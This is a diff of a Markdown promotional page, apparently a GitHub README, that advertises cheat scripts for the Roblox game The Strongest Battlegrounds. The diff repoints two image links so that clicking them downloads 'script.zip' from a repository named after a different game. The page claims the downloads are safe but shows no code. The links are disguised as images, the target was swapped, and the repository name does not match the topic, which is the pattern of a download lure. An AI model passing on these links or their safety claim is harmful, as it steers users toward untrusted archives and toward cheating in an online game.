@@ -5,10 +5,10 @@ If you’re a Roblox warrior looking to crush your enemies with style, speed, an
 Whether you want **auto farm**, **instant kill**, **Godmode**, or an all-in-one GUI, this article covers everything you need to know about **The Strongest Battlegrounds scripts** — from how they work to where to get the best versions safely.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/523a366c-9e2f-496d-b51d-08113ff813e9)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
